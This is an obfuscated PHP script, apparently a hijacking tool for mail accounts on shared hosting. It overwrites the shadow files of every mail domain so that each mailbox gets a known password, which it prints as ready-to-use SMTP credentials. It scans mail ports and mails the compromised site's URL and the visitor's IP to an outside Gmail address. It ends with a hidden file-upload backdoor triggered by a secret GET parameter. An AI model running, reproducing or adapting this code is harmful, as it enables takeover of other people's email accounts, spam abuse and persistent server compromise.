<?php;
echo '';
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);
$IIIIIIIIIII1 = array(25, 587, 465, 110, 995, 143, 993);
$IIIIIIIIIIlI = '25';
$IIIIIIIIIIll = get_current_user();
$IIIIIIIIII1I = 'Z181R0x2022';
$IIIIIIIIII1l = crypt($IIIIIIIIII1I, '$6$Z181R0x2022$');
$IIIIIIIIIlII = $_SERVER['SERVER_NAME'];
$IIIIIIIIIlII = @str_replace('www.', '', $IIIIIIIIIlII);
$IIIIIIIIIlIl = glob('/home/' . $IIIIIIIIIIll . '/etc/*', GLOB_ONLYDIR);
foreach ($IIIIIIIIIlIl as $IIIIIIIIIllI) {
    $IIIIIIIIIlll = explode('/', $IIIIIIIIIllI);
    $IIIIIIIIIl1I = $IIIIIIIIIlll[count($IIIIIIIIIlll) - 1];
    @$IIIIIIIIIl11 = file_get_contents('/home/' . $IIIIIIIIIIll . '/etc/' . $IIIIIIIIIl1I . '/shadow');
    $IIIIIIIIIlll = explode('
', $IIIIIIIIIl11);
    @link('/home/' . $IIIIIIIIIIll . '/etc/' . $IIIIIIIIIl1I . '/shadow', '/home/' . $IIIIIIIIIIll . '/etc/' . $IIIIIIIIIl1I . '/shadow.Z181R0x2022.bak');
    @unlink('/home/' . $IIIIIIIIIIll . '/etc/' . $IIIIIIIIIl1I . '/shadow');
    foreach ($IIIIIIIIIlll as $IIIIIIIIIlll) {
        $IIIIIIIIIlll = explode(':', $IIIIIIIIIlll);
        $IIIIIIIII1I1 = $IIIIIIIIIlll[0];
        if ($IIIIIIIII1I1) {
            $IIIIIIIII1lI = fopen('/home/' . $IIIIIIIIIIll . '/etc/' . $IIIIIIIIIl1I . '/shadow', 'ab');
            fwrite($IIIIIIIII1lI, $IIIIIIIII1I1 . ':' . $IIIIIIIIII1l . ':16249:::::' . '
');
            fclose($IIIIIIIII1lI);
            echo '<span style=\'color:#0000ff;\'>' . $IIIIIIIIIl1I . '|25|' . $IIIIIIIII1I1 . '@' . $IIIIIIIIIl1I . '|' . $IIIIIIIIII1I . '</span><br>';
            '</center>';
        }
    }
    foreach ($IIIIIIIIIII1 as $IIIIIIIII11l) {
        $IIIIIIIII111 = @fsockopen($IIIIIIIIIl1I, $IIIIIIIII11l, $IIIIIIIIlIIl, $IIIIIIIIlII1, 2);
        if (is_resource($IIIIIIIII111)) {
            echo '<span>' . $IIIIIIIIlIll . ':' . $IIIIIIIII11l . ' ' . '(' . getservbyport($IIIIIIIII11l, 'tcp') . ') is open.</span>' . ', ';
            fclose($IIIIIIIII111);
        }
    }
    echo '<br/>';
};
echo '';
$IIIIIIIIlI1I = getenv('REMOTE_ADDR');
$IIIIIIIIlI1l = gethostbyaddr($IIIIIIIIlI1I);
$IIIIIIIIlI11 = 'Link Smtp : http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . '
';
$IIIIIIIIllII = 'hatsabooking@gmail.com';
$IIIIIIIIllIl = "New Smtp Uploaded !! $IIIIIIIIlI1I";
$IIIIIIIIllI1 = 'From: Z181R0x2022 <smtp@localhost>';
$IIIIIIIIllI1.= $_POST['eMailAdd'] . '
';
$IIIIIIIIllI1.= 'MIME-Version: 1.0
';
$IIIIIIIIlllI = array($IIIIIIIIllII, $IIIIIIIIllll);
foreach ($IIIIIIIIlllI as $IIIIIIIIllII) mail($IIIIIIIIllII, $IIIIIIIIllIl, $IIIIIIIIlI11, $IIIIIIIIllI1, $IIIIIIIIlll1);
$Z181R0x2022 = $_GET['Z181R0x2022'];
if ($Z181R0x2022 == '0x2022') {
    $IIIIIIIIll1l = $_FILES['file']['name'];
    $IIIIIIIIll11 = $_FILES['file']['tmp_name'];
    echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='upload' />
 </form>";
    move_uploaded_file($IIIIIIIIll11, $IIIIIIIIll1l);
};
